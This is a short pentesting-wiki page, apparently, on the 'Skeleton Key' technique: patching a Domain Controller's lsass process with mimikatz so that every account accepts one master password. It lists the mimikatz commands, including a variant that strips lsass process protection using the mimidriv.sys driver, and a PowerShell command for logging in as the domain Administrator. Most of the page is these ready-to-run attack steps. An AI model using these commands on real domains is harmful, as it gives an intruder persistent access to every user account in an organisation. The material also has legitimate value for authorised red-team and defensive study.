---
description: >-
  Skeleton key is a persistence technique where it is possible to patch a Domain
  Controller (lsass process) so it allows access as any user with a single
  password.
---

# Skeleton Key

{% hint style="danger" %}
All the publicly known methods are NOT persistent across reboots.
{% endhint %}

## Creating a skeleton key

Password will be **mimikatz**

```text
privilege::debug
misc::skeleton
```

### lsass is protected

In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver \(mimidriv.sys\) on disk of the target DC:

```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

{% hint style="info" %}
This technique is very noisy in logs - Service installation \(Kernel mode driver\)
{% endhint %}

## Login with any user

```text
Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator
```

